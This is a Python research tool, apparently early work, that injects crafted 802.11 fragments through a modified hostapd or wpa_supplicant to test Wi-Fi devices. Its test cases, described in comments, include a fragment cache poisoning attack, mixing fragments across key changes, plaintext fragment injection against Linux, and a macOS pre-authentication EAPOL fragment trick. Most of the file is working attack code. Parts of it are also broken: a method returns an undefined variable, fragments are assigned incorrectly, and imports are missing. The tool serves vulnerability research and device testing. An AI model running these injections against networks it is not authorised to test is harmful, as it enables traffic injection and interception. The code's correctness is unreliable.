#!/usr/bin/env python3
from libwifi import *
import abc, sys, socket, struct, time, subprocess, atexit, select, copy
from wpaspy import Ctrl
from scapy.contrib.wpa_eapol import WPA_key

# NOTES:
# - The ath9k_htc devices by default overwrite the injected sequence number.
#   However, this number is not incremented when the MoreFragments flag is set,
#   meaning we can inject fragmented frames (albeit with a different sequence
#   number than then one we use for injection this this script).
# - The above trick does not work when we want to inject other frames between
#   two fragmented frames (the chip will assign them difference sequence numbers).
#   Even when the fragments use a unique QoS TID, sending frames between them
#   will make the chip assign difference sequence numbers to both fragments.
# - Overwriting the sequence can be avoided by patching `ath_tgt_tx_seqno_normal`
#   and commenting out the two lines that modify `i_seq`.
# - See also the comment in Station.inject_next_frags to avoid other bugs with
#   ath9k_htc when injecting frames with the MF flag and while being in AP mode.

#MAC_STA2 = "d0:7e:35:d9:80:91"
#MAC_STA2 = "20:16:b9:b2:73:7a"
MAC_STA2 = "80:5a:04:d4:54:c4"

# ----------------------------------- Utility Commands -----------------------------------

def wpaspy_clear_messages(ctrl):
	# Clear old replies and messages from the hostapd control interface. This is not
	# perfect and there may be new unrelated messages after executing this code.
	while ctrl.pending():
		ctrl.recv()

def wpaspy_command(ctrl, cmd):
	wpaspy_clear_messages(ctrl)
	rval = ctrl.request(cmd)
	if "UNKNOWN COMMAND" in rval:
		log(ERROR, "wpa_supplicant did not recognize the command %s. Did you (re)compile wpa_supplicant?" % cmd.split()[0])
		quit(1)
	elif "FAIL" in rval:
		log(ERROR, f"Failed to execute command {cmd}")
		quit(1)
	return rval

def argv_pop_argument(argument):
	if not argument in sys.argv: return False
	idx = sys.argv.index(argument)
	del sys.argv[idx]
	return True

class TestOptions():
	def __init__(self):
		# Workaround for ath9k_htc bugs
		self.inject_workaround = False

		self.interface = None
		self.clientip = None
		self.routerip = None

# ----------------------------------- Tests -----------------------------------

# XXX --- We should always first see how the DUT reactions to a normal packet.
#	  For example, Aruba only responded to DHCP after reconnecting, and
#	  ignored ICMP and ARP packets.
REQ_ARP, REQ_ICMP, REQ_DHCP = range(3)

def generate_request(sta, ptype):
	header = sta.get_header()
	if ptype == REQ_ARP:
		# XXX --- Add extra checks on the ARP packet
		check = lambda p: ARP in p and p.hwsrc == sta.peermac and p.psrc == sta.peerip
		request = LLC()/SNAP()/ARP(op=1, hwsrc=sta.mac, psrc=sta.ip, hwdst=sta.peermac, pdst=sta.peerip)

	elif ptype == REQ_ICMP:
		label = b"test_ping_icmp"
		check = lambda p: ICMP in p and label in raw(p)
		request = LLC()/SNAP()/IP(src=sta.ip, dst=sta.peerip)/ICMP()/Raw(label)

	elif ptype == REQ_DHCP:
		xid = random.randint(0, 2**31)
		check = lambda p: BOOTP in p and p[BOOTP].xid == xid

		rawmac = bytes.fromhex(sta.mac.replace(':', ''))
		request = LLC()/SNAP()/IP(src="0.0.0.0", dst="255.255.255.255")
		request = request/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=xid)
		request = request/DHCP(options=[("message-type", "discover"), "end"])

		# We assume DHCP discover is sent towards the AP.
		header.addr3 = "ff:ff:ff:ff:ff:ff"

	return header, request, check

class Frag():
	# StartAuth: when starting the handshake
	# BeforeAuth: right before last message of the handshake
	# AfterAuth: right after last message of the handshake
	# Connected: 1 second after handshake completed (allows peer to install keys)
	StartAuth, BeforeAuth, AfterAuth, Connected = range(4)

	# GetIp: request an IP before continueing (or use existing one)
	# Rekey: force or wait for a PTK rekey
	# Reconnect: force a reconnect
	GetIp, Rekey, Reconnect = range(3)

	def __init__(self, trigger, encrypted, frame=None, flags=None, inc_pn=1):
		self.trigger = trigger

		if flags != None and not isinstance(flags, list):
			self.flags = [flags]
		else:
			self.flags = flags if flags != None else []

		self.encrypted = encrypted
		self.inc_pn = inc_pn
		self.frame = frame

	def next_flag(self):
		if len(self.flags) == 0:
			return None
		return self.flags[0]

	def pop_flag(self):
		if len(self.flags) == 0:
			return None
		return self.flags.pop(0)

class Test(metaclass=abc.ABCMeta):
	"""
	Base class to define tests. The default defined methods can be used,
	but they can also be overriden if desired.
	"""

	def __init__(self, fragments=None):
		self.fragments = fragments if fragments != None else []
		self.generated = False

	def next_trigger_is(self, trigger):
		if len(self.fragments) == 0:
			return False
		return self.fragments[0].next_flag() == None and \
			self.fragments[0].trigger == trigger

	def next_flag(self):
		if len(self.fragments) == 0:
			return None
		return self.fragments[0].next_flag()

	def pop_flag(self):
		if len(self.fragments) == 0:
			return None
		return self.fragments[0].pop_flag()

	def next(self, station):
		if not self.generated:
			self.generate(station)
			self.generated = True

		frag = self.fragments[0]
		del self.fragments[0]
		return frag

	@abc.abstractmethod
	def generate(self, station):
		pass

	@abc.abstractmethod
	def check(self, p):
		return False

class PingTest(Test):
	def __init__(self, ptype, fragments, bcast=False, separate_with=None):
		super().__init__(fragments)
		self.ptype = ptype
		self.bcast = bcast
		self.separate_with = separate_with
		self.check_fn = None

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def generate(self, station):
		log(STATUS, "Generating ping test", color="green")

		# Generate the header and payload
		header, request, self.check_fn = generate_request(station, self.ptype)

		# Generate all the individual (fragmented) frames
		frames = create_fragments(header, request, len(self.fragments))

		# Assign frames to the existing fragment objects
		for frag, frame in zip(self.fragments, frames):
			if self.bcast:
				frame.addr1 = "ff:ff:ff:ff:ff:ff"
			frag.frame = frame

		# Put the separator between each fragment if requested.
		if self.separate_with != None:
			# XXX TODO: when injecting frames with different priorities, these
			#	    may be reordered by the Wi-Fi chip!! Can be prevent this?
			for i in range(len(self.fragments) - 1, 0, -1):
				prev_frag = self.fragments[i - 1]

				sep_frag = Frag(prev_frag.trigger, prev_frag.encrypted)
				sep_frag.frame = self.separate_with.copy()
				station.set_header(sep_frag.frame)

				self.fragments.insert(i, sep_frag)

class LinuxTest(Test):
	def __init__(self, ptype):
		super().__init__([
			Frag(Frag.Connected, True),
			Frag(Frag.Connected, True),
			Frag(Frag.Connected, False)
		])
		self.ptype = ptype
		self.check_fn = None

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def generate(self, station):
		header, request, self.check_fn = generate_request(station, self.ptype)
		frag1, frag2 = create_fragments(header, request, 2)

		# Fragment 1: normal
		self.fragments[0].frame = frag1

		# Fragment 2: make Linux update latest used crypto Packet Number
		frag2enc = frag2.copy()
		frag2enc.SC ^= (1 << 4) | 1
		self.fragments[1].frame = frag2enc

		# Fragment 3: can now inject last fragment as plaintext
		self.fragments[2].frame = frag2

		return test

class MacOsTest(Test):
	"""
	See docs/macoxs-reversing.md for background on the attack.
	"""
	def __init__(self, ptype):
		super().__init__([
			Frag(Frag.BeforeAuth, False),
			Frag(Frag.BeforeAuth, False)
		])
		self.ptype = ptype
		self.check_fn = None

	def check(self, p):
		if self.check_fn == None:
			return False
		return self.check_fn(p)

	def generate(self, station):
		# First fragment is the start of an EAPOL frame
		header = station.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, _ = create_fragments(header, data=request, num_frags=2)

		# Second fragment has same sequence number. Will be accepted
		# before authenticated because previous fragment was EAPOL.
		# By sending to broadcast, this fragment will not be reassembled
		# though, meaning it will be treated as a full frame (and not EAPOL).
		_, request, self.check_fn = generate_request(station, self.ptype)
		frag2, = create_fragments(header, data=request, num_frags=1)
		frag2.SC |= 1
		frag2.addr1 = "ff:ff:ff:ff:ff:ff"

		self.fragments[0].frame = frag1
		self.fragments[1].frame = frag2

class EapolTest(Test):
	# TODO:
	# Test 1: plain unicast EAPOL fragment, plaintext broadcast frame => trivial frame injection
	# Test 2: plain unicast EAPOL fragment, encrypted broadcast frame => just an extra test
	# Test 3: plain unicast EAPOL fragment, encrypted unicast fragment => demonstrates mixing of plain/encrypted fragments
	# Test 4: EAPOL and A-MSDU tests?
	def __init__(self):
		super().__init__([
			Frag(Frag.BeforeAuth, False),
			Frag(Frag.BeforeAuth, False)
		])

	def generate(self, station):
		header = station.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, frag2 = create_fragments(header, data=request, num_frags=2)

		frag1copy, frag2copy = create_fragments(header, data=request, num_frags=2)
		frag1copy.addr1 = "ff:ff:ff:ff:ff:ff"
		frag2copy.addr1 = "ff:ff:ff:ff:ff:ff"

		self.fragments[0].frame = frag1
		self.fragments[0].frame = frag2

# ----------------------------------- Abstract Station Class -----------------------------------

class Station():
	def __init__(self, daemon, mac, ds_status):
		self.daemon = daemon
		self.options = daemon.options
		self.test = daemon.options.test
		self.txed_before_auth = False
		self.txed_before_auth_done = False
		self.obtained_ip = False

		# Don't reset PN to have consistency over rekeys and reconnects
		self.reset_keys()
		self.pn = 0x100

		# Contains either the "to-DS" or "from-DS" flag.
		self.FCfield = Dot11(FCfield=ds_status).FCfield
		self.seqnum = 1

		# MAC address and IP of the station that our script controls.
		# Can be either an AP or client.
		self.mac = mac
		self.ip = None

		# MAC address and IP of the peer station.
		# Can be either an AP or client.
		self.peermac = None
		self.peerip = None

		# To test frame forwarding to a 3rd party
		self.othermac = None
		self.otherip = None

		self.time_connected = None

	def reset_keys(self):
		self.tk = None
		self.gtk = None
		self.gtk_idx = None

	def handle_mon(self, p):
		pass

	def handle_eth(self, p):
		repr(repr(p))

		if self.test != None and self.test.check != None and self.test.check(p):
			log(STATUS, "SUCCESSFULL INJECTION", color="green")
			print(repr(p))
			self.test = None

	def send_mon(self, data, prior=1):
		"""
		Right after completing the handshake, it occurred several times that our
		script was sending data *before* the key had been installed (or the port
		authorized). This meant traffic was dropped. Use this function to manually
		send frames over the monitor interface to ensure delivery and encryption.
		"""

		# If it contains an Ethernet header, strip it, and take addresses from that
		p = self.get_header(prior=prior)
		if Ether in data:
			payload = data.payload
			p.addr2 = data.src

			# This tests if to-DS is set
			if p.FCfield & 1:
				p.addr3 = data.dst
			else:
				p.addr1 = data.dst

		else:
			payload = data

		p = p/LLC()/SNAP()/payload
		if self.tk: p = self.encrypt(p)

		print("[Injecting]", repr(p))
		daemon.inject_mon(p)

	def set_header(self, p, forward=False, prior=None):
		"""Set addresses to send frame to the peer or the 3rd party station."""
		# Forward request only makes sense towards the DS/AP
		assert (not forward) or ((p.FCfield & 1) == 0)
		# Priority is only supported in data frames
		assert (prior == None) or (p.type == 2)

		p.FCfield |= self.FCfield
		if prior != None:
			p.subtype = 8
			if not Dot11QoS in p:
				p.add_payload(Dot11QoS(TID=prior))
			else:
				p[Dot11QoS].TID = prior

		destmac = self.othermac if forward else self.peermac
		p.addr1 = self.peermac
		p.addr2 = self.mac
		# Here p.FCfield & 1 tests if to-DS is set. Then this fields
		# represents the final destination. Otherwise its the BSSID.
		p.addr3 = destmac if p.FCfield & 1 else self.mac

	def get_header(self, seqnum=None, prior=2, **kwargs):
		"""
		Generate a default common header. By default use priority of 1 so destination
		will still accept lower Packet Numbers on other priorities.
		"""

		if seqnum == None:
			seqnum = self.seqnum
			self.seqnum += 1

		header = Dot11(type="Data", SC=(seqnum << 4))
		self.set_header(header, prior=prior, **kwargs)
		return header

	def encrypt(self, frame, inc_pn=1):
		self.pn += inc_pn
		key, keyid = (self.tk, 0) if int(frame.addr1[1], 16) & 1 == 0 else (self.gtk, self.gtk_idx)
		encrypted = encrypt_ccmp(frame, key, self.pn, keyid)
		return encrypted

	def handle_connecting(self, peermac):
		# If the address was already set, it should not be changing
		assert self.peermac == None or self.peermac == peermac
		self.peermac = peermac

		# Clear the keys on a new connection
		self.reset_keys()
		self.time_connected = None

	def inject_next_frags(self, trigger):
		frame = None

		while self.test != None and self.test.next_trigger_is(trigger):
			Frag = self.test.next(self)
			if Frag.encrypted:
				assert self.tk != None and self.gtk != None
				frame = self.encrypt(Frag.frame, inc_pn=Frag.inc_pn)
				log(STATUS, "Encrypted fragment with key " + self.tk.hex())
			else:
				frame = Frag.frame
			self.daemon.inject_mon(frame)
			print("[Injected fragment]", repr(frame))

		# With ath9k_htc devices, there's a bug when injecting a frame with the
		# More Fragments (MF) field *and* operating the interface in AP mode
		# while the target is connected. For some reason, after injecting the
		# frame, it halts the transmission of all other normal frames (this even
		# includes beacons). Injecting a dummy packet like below avoid this,
		# and assures packets keep being sent normally (when the last fragment
		# had the MF flag set).
		#
		# Note: when the device is only operating in monitor mode, this does
		#	not seem to be a problem.
		#
		if self.options.inject_workaround and frame != None and frame.FCfield & 0x4 != 0:
			self.daemon.inject_mon(Dot11(addr1="ff:ff:ff:ff:ff:ff"))
			print("[Injected packet] Prevent ath9k_htc bug after fragment injection")

	def trigger_eapol_events(self, eapol):
		key_type   = eapol.key_info & 0x0008
		key_ack    = eapol.key_info & 0x0080
		key_mic    = eapol.key_info & 0x0100
		key_secure = eapol.key_info & 0x0200
		# Detect Msg3/4 assumig WPA2 is used --- XXX support WPA1 as well
		is_msg3_or_4 = key_secure != 0

		# Inject any fragments before authenticating
		if not self.txed_before_auth:
			log(STATUS, "Frag.StartAuth", color="green")
			self.inject_next_frags(Frag.StartAuth)
			self.txed_before_auth = True
			self.txed_before_auth_done = False

		# Inject any fragments when almost done authenticating
		elif is_msg3_or_4 and not self.txed_before_auth_done:
			log(STATUS, "Frag.BeforeAuth", color="green")
			self.inject_next_frags(Frag.BeforeAuth)
			self.txed_before_auth_done = True
			self.txed_before_auth = False

		self.time_connected = None

	def handle_eapol_tx(self, eapol):
		eapol = EAPOL(eapol)
		self.trigger_eapol_events(eapol)

		# - Send over monitor interface to assure order compared to injected fragments.
		# - This is also important because the station might have already installed the
		#   key before this script can send the EAPOL frame over Ethernet (but we didn't
		#   yet request the key from this script).
		# - Send with high priority, otherwise Frag.AfterAuth might be send before
		#   the EAPOL frame by the Wi-Fi chip.
		self.send_mon(eapol)

	def check_flags_and_inject(self, trigger):
		if self.test == None:
			return

		flag = self.test.next_flag()
		if flag == Frag.GetIp:
			if self.obtained_ip:
				self.test.pop_flag()
			else:
				# (Re)transmit DHCP frames (or as AP print status message)
				self.daemon.get_ip(self)
				# Either schedule a new Connected event, or the initial one. Use 2 seconds
				# because requesting IP generally takes a bit of time.
				# TODO: Add an option to configure this timeout.
				self.time_connected = time.time() + 1
				log(WARNING, f"Scheduling next Frag.Connected at {self.time_connected}")
				return

		self.inject_next_frags(trigger)

		flag = self.test.pop_flag()
		if flag == Frag.Rekey:
			# Force rekey as AP, wait on rekey as client
			self.daemon.rekey(self)

		elif flag == Frag.Reconnect:
			# Full reconnect as AP, reassociation as client
			self.daemon.reconnect(self)

	def handle_authenticated(self):
		"""Called after completion of the 4-way handshake or similar"""
		self.tk = self.daemon.get_tk(self)
		self.gtk, self.gtk_idx = self.daemon.get_gtk()

		# Note that self.time_connect may get changed in check_flags_and_inject
		log(STATUS, "Frag.AfterAuth", color="green")
		self.time_connected = time.time() + 1
		self.check_flags_and_inject(Frag.AfterAuth)

	def handle_connected(self):
		"""This is called ~1 second after completing the handshake"""
		log(STATUS, "Frag.Connected", color="green")
		self.check_flags_and_inject(Frag.Connected)

	def set_ip_addresses(self, ip, peerip):
		self.ip = ip
		self.peerip = peerip
		self.obtained_ip = True

	def time_tick(self):
		if self.time_connected != None and time.time() > self.time_connected:
			# Note that handle_connected may schedule a new Connected event, so it's
			# important to clear time_connected *before* calling handle_connected.
			self.time_connected = None
			self.handle_connected()

# ----------------------------------- Client and AP Daemons -----------------------------------

class Daemon(metaclass=abc.ABCMeta):
	def __init__(self, options):
		self.options = options

		# Note: some kernels don't support interface names of 15+ characters
		self.nic_iface = options.interface
		self.nic_mon = "mon" + self.nic_iface[:12]

		self.process = None
		self.sock_eth = None
		self.sock_mon = None

	@abc.abstractmethod
	def start_daemon(self):
		pass

	def configure_daemon(self):
		pass

	def handle_mon(self, p):
		pass

	def handle_eth(self, p):
		pass

	@abc.abstractmethod
	def time_tick(self, station):
		pass

	@abc.abstractmethod
	def get_tk(self, station):
		pass

	def get_gtk(self):
		gtk, idx = wpaspy_command(self.wpaspy_ctrl, "GET_GTK").split()
		return bytes.fromhex(gtk), int(idx)

	@abc.abstractmethod
	def get_ip(self, station):
		pass

	@abc.abstractmethod
	def rekey(self, station):
		pass

	@abc.abstractmethod
	def reconnect(self, station):
		pass

	# TODO: Might be good to put this into libwifi?
	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Only create a new monitor interface if it does not yet exist
		try:
			scapy.arch.get_if_index(self.nic_mon)
		except IOError:
			subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
			subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])

		# 2. Configure monitor mode on interfaces
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

		# 3. Remember whether to need to perform a workaround.
		driver = get_device_driver(self.nic_iface)
		if driver == None:
			log(WARNING, "Unable to detect driver of interface!")
			log(WARNING, "Injecting fragments may contains bugs.")
		elif driver == "ath9k_htc":
			options.inject_workaround = True
			log(STATUS, "Detect ath9k_htc, using injection bug workarounds")

	def inject_mon(self, p):
		self.sock_mon.send(p)

	def inject_eth(self, p):
		self.sock_eth.send(p)

	def run(self):
		self.configure_interfaces()
		self.start_daemon()
		self.sock_mon = MonitorSocket(type=ETH_P_ALL, iface=self.nic_mon)
		self.sock_eth = L2Socket(type=ETH_P_ALL, iface=self.nic_iface)

		# Open the wpa_supplicant or hostapd control interface
		try:
			self.wpaspy_ctrl = Ctrl("wpaspy_ctrl/" + self.nic_iface)
			self.wpaspy_ctrl.attach()
		except:
			log(ERROR, "It seems wpa_supplicant/hostapd did not start properly, please inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise it won't start properly.")
			raise

		# Post-startup configuration of the supplicant or AP
		self.configure_daemon()

		# Monitor the virtual monitor interface of the client and perform the needed actions
		while True:
			sel = select.select([self.sock_mon, self.sock_eth, self.wpaspy_ctrl.s], [], [], 0.5)
			if self.sock_mon in sel[0]:
				p = self.sock_mon.recv()
				if p != None: self.handle_mon(p)

			if self.sock_eth in sel[0]:
				p = self.sock_eth.recv()
				if p != None and Ether in p: self.handle_eth(p)

			if self.wpaspy_ctrl.s in sel[0]:
				msg = self.wpaspy_ctrl.recv()
				self.handle_wpaspy(msg)

			self.time_tick()

	def stop(self):
		log(STATUS, "Closing Hostap daemon and cleaning up ...")
		if self.process:
			self.process.terminate()
			self.process.wait()
		if self.sock_eth: self.sock_eth.close()
		if self.sock_mon: self.sock_mon.close()


class Authenticator(Daemon):
	def __init__(self, options):
		super().__init__(options)

		self.apmac = None
		self.sock_eth = None
		self.dhcp = None
		self.arp_sender_ip = None
		self.arp_sock = None
		self.stations = dict()

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET_TK " + station.peermac)
		return bytes.fromhex(tk)

	def time_tick(self):
		for station in self.stations.values():
			station.time_tick()

	def get_ip(self, station):
		log(STATUS, f"Waiting on client {station.peermac} to get IP")

	def rekey(self, station):
		wpaspy_command(self.wpaspy_ctrl, "REKEY_PTK " + station.peermac)

	def reconnect(self, station):
		# Confirmed to *instantly* reconnect: Arch Linux, Windows 10 with Intel WiFi chip, iPad Pro 13.3.1
		# Reconnects only after a few seconds: MacOS (same with other reasons and with deauthentication)
		cmd = f"DISASSOCIATE {station.peermac} reason={WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA}"
		wpaspy_command(self.wpaspy_ctrl, cmd)

	def handle_eth_dhcp(self, p, station):
		if not DHCP in p or not station.peermac in self.dhcp.leases: return

		# This assures we only mark it was connected after receiving a DHCP Request
		req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
		if req_type != 3: return

		peerip = self.dhcp.leases[station.peermac]
		log(STATUS, f"Client {station.peermac} with IP {peerip} has connected")
		station.set_ip_addresses(self.arp_sender_ip, peerip)

	def handle_eth(self, p):
		# Ignore clients not connected to the AP
		clientmac = p[Ether].src
		if not clientmac in self.stations:
			return

		# Let clients get IP addresses
		self.dhcp.reply(p)
		self.arp_sock.reply(p)

		# Monitor DHCP messages to know when a client received an IP address
		station = self.stations[clientmac]
		if not station.obtained_ip:
			self.handle_eth_dhcp(p, station)
		else:
			station.handle_eth(p)

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "AP-STA-CONNECTING" in msg:
			cmd, clientmac = msg.split()
			if not clientmac in self.stations:
				station = Station(self, self.apmac, "from-DS")
				self.stations[clientmac] = station

			log(STATUS, f"Client {clientmac} is connecting")
			station = self.stations[clientmac]
			station.handle_connecting(clientmac)

		elif "EAPOL-TX" in msg:
			cmd, clientmac, payload = msg.split()
			if not clientmac in self.stations:
				log(WARNING, f"Sending EAPOL to unknown client {clientmac}.")
				return
			self.stations[clientmac].handle_eapol_tx(bytes.fromhex(payload))

		# XXX update so this also works with rekeys
		elif "AP-STA-CONNECTED" in msg:
			cmd, clientmac = msg.split()
			if not clientmac in self.stations:
				log(WARNING, f"Unknown client {clientmac} finished authenticating.")
				return
			self.stations[clientmac].handle_authenticated()

	def start_daemon(self):
		log(STATUS, "Starting hostapd ...")
		try:
			self.process = subprocess.Popen([
				"../hostapd/hostapd",
				"-i", self.nic_iface,
				"hostapd.conf", "-dd"
			])
			time.sleep(1)
		except:
			if not os.path.exists("../hostapd/hostapd"):
				log(ERROR, "hostapd executable not found. Did you compile hostapd?")
			raise

		self.apmac = scapy.arch.get_if_hwaddr(self.nic_iface)

	def configure_daemon(self):
		# Intercept EAPOL packets that the AP wants to send
		wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")

		# Let scapy handle DHCP requests
		self.dhcp = DHCP_sock(sock=self.sock_eth,
						domain='mathyvanhoef.com',
						pool=Net('192.168.100.0/24'),
						network='192.168.100.0/24',
						gw='192.168.100.254',
						renewal_time=600, lease_time=3600)
		# Configure gateway IP: reply to ARP and ping requests
		subprocess.check_output(["ifconfig", self.nic_iface, "192.168.100.254"])

		# Use a dedicated IP address for our ARP ping and replies
		self.arp_sender_ip = self.dhcp.pool.pop()
		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.arp_sender_ip, ARP_addr=self.apmac)
		log(STATUS, f"Will inject ARP packets using sender IP {self.arp_sender_ip}")


class Supplicant(Daemon):
	def __init__(self, options):
		super().__init__(options)
		self.station = None
		self.arp_sock = None
		self.dhcp_xid = None

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET tk")
		if tk == "none":
			raise Exception("Couldn't retrieve session key of client")
		else:
			return bytes.fromhex(tk)

	def get_ip(self, station):
		self.send_dhcp_discover()

	def rekey(self, station):
		# WAG320N: does not work (Broadcom - no reply)
		# MediaTek: starts handshake. But must send Msg2/4 in plaintext! Request optionally in plaintext.
		#	Maybe it's removing the current PTK before a rekey?
		# RT-N10: we get a deauthentication as a reply. Connection is killed.
		# LANCOM: does not work (no reply)
		# Aruba: does not work (no reply)
		# ==> Only reliable way is to configure AP to constantly rekey the PTK, and wait
		#     untill the AP starts a rekey.
		#wpaspy_command(self.wpaspy_ctrl, "KEY_REQUEST 0 1")

		log(STATUS, "Client cannot force rekey. Waiting on AP to start PTK rekey.", color="orange")

	def time_tick(self):
		self.station.time_tick()

	def send_dhcp_discover(self):
		if self.dhcp_xid == None:
			self.dhcp_xid = random.randint(0, 2**31)

		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
		req = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
		req = req/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=self.dhcp_xid)
		req = req/DHCP(options=[("message-type", "discover"), "end"])
		print(repr(req))

		self.station.send_mon(req)
		#self.sock_eth.send(req)

	def send_dhcp_request(self, offer):
		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
		myip = offer[BOOTP].yiaddr
		sip = offer[BOOTP].siaddr
		xid = offer[BOOTP].xid

		reply = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
		reply = reply/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=self.dhcp_xid)
		reply = reply/DHCP(options=[("message-type", "request"), ("requested_addr", myip),
					    ("hostname", "fragclient"), "end"])

		self.station.send_mon(reply)
		#self.sock_eth.send(reply)

	def handle_eth_dhcp(self, p):
		"""Handle packets needed to connect and request an IP"""
		if not DHCP in p: return

		req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')

		# DHCP Offer
		if req_type == 2:
			log(STATUS, "Received DHCP offer, sending DHCP request.")
			self.send_dhcp_request(p)

		# DHCP Ack
		elif req_type == 5:
			clientip = p[BOOTP].yiaddr
			serverip = p[IP].src
			log(STATUS, f"Received DHCP ack. My ip is {clientip} and router is {serverip}.")

			self.initialize_ips(clientip, serverip)

	def initialize_ips(self, clientip, serverip):
		self.station.set_ip_addresses(clientip, serverip)
		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.station.ip, ARP_addr=self.station.mac)

	def handle_eth(self, p):
		if BOOTP in p and p[BOOTP].xid == self.dhcp_xid:
			self.handle_eth_dhcp(p)
		else:
			if self.arp_sock != None:
				self.arp_sock.reply(p)
			self.station.handle_eth(p)

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "WPA: Key negotiation completed with" in msg:
			# This get's the current keys
			self.station.handle_authenticated()

		# Trying to authenticate with 38:2c:4a:c1:69:bc (SSID='backupnetwork2' freq=2462 MHz)
		elif "Trying to authenticate with" in msg:
			p = re.compile("Trying to authenticate with (.*) \(SSID")
			peermac = p.search(msg).group(1)
			self.station.handle_connecting(peermac)

		elif "EAPOL-TX" in msg:
			cmd, srcaddr, payload = msg.split()
			self.station.handle_eapol_tx(bytes.fromhex(payload))

	def reconnect(self, station):
		log(STATUS, "Reconnecting to the AP.", color="green")
		wpaspy_command(self.wpaspy_ctrl, "REASSOCIATE")

	def configure_daemon(self):
		# TODO: Only enable networks once our script is ready, to prevent
		#	wpa_supplicant from connecting before our start started.

		# Optimize reassoc-to-same-BSS. This makes the "REASSOCIATE" command skip the
		# authentication phase (reducing the chance that packet queues are reset).
		wpaspy_command(self.wpaspy_ctrl, "SET reassoc_same_bss_optim 1")
		wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")

		# If the user already supplied IPs we can immediately perform tests
		if self.options.clientip and self.options.routerip:
			self.initialize_ips(self.options.clientip, self.options.routerip)

	def start_daemon(self):
		log(STATUS, "Starting wpa_supplicant ...")
		try:
			self.process = subprocess.Popen([
				"../wpa_supplicant/wpa_supplicant",
				"-Dnl80211",
				"-i", self.nic_iface,
				"-cclient.conf",
				"-dd"])
			time.sleep(1)
		except:
			if not os.path.exists("../wpa_supplicant/wpa_supplicant"):
				log(ERROR, "wpa_supplicant executable not found. Did you compile wpa_supplicant?")
			raise

		clientmac = scapy.arch.get_if_hwaddr(self.nic_iface)
		self.station = Station(self, clientmac, "to-DS")

# ----------------------------------- Main Function -----------------------------------

def cleanup():
	daemon.stop()

def prepare_tests(test_id):
	if test_id == 0:
		# Simple ping as sanity check
		test = PingTest(REQ_DHCP,
				[Frag(Frag.Connected, True, flags=Frag.GetIp)])
				#[Frag(Frag.AfterAuth, True, flags=Frag.Rekey)])

	elif test_id == 1:
		# Check if the STA receives broadcast (useful test against AP)
		test = PingTest(REQ_DHCP,
				[Frag(Frag.Connected, True)],
				bcast=True)

	elif test_id == 2:
		# Cache poison attack. Worked against Linux Hostapd and RT-AC51U.
		test = PingTest(REQ_ICMP,
				[Frag(Frag.Connected, True),
				 Frag(Frag.AfterAuth, True, flags=Frag.Reconnect)])

	elif test_id == 3:
		# Two fragments over different PTK keys. Against RT-AC51U AP we can
		# trigger a rekey, but must do the rekey handshake in plaintext.
		test = PingTest(REQ_DHCP,
				[Frag(Frag.Connected, True),
				 Frag(Frag.AfterAuth, True, flags=Frag.Rekey)])

	elif test_id == 4:
		# Two fragments over different PTK keys. Against RT-AC51U AP we can
		# trigger a rekey, but must do the rekey handshake in plaintext.
		test = PingTest(REQ_DHCP,
				[Frag(Frag.BeforeAuth, True, flags=Frag.Rekey),
				 Frag(Frag.AfterAuth, True)])

	elif test_id == 5:
		test = MacOsTest(REQ_DHCP)

	elif test_id == 6:
		# Check if we can send frames in between fragments
		separator = Dot11(type="Data", subtype=8, SC=(33 << 4))/Dot11QoS()/LLC()/SNAP()
		#separator.addr2 = "00:11:22:33:44:55"
		#separator.addr3 = "ff:ff:ff:ff:ff:ff"
		test = PingTest(REQ_DHCP,
				[Frag(Frag.Connected, True),
				 Frag(Frag.Connected, True)],
				 separate_with=separator)

	# XXX TODO : Hardware decrypts it using old key, software using new key?
	#	     So right after rekey we inject first with old key, second with new key?

	# XXX TODO : What about extended functionality where we can have
	#	     two simultaneously pairwise keys?!?!

	# TODO:
	# - Test case to check if the receiver supports interleaved priority
	#   reception. It seems Windows 10 / Intel might not support this.
	# - Test case with a very lage aggregated frame (which is normally not
	#   allowed but some may accept it). And a variation to check how APs
	#   will forward such overly large frame (e.g. force fragmentation).
	# - 1.1 Encrypted (= sanity ping test)
	#   1.2 Plaintext (= text plaintext injection)
	#   1.3 Encrpted, Encrypted
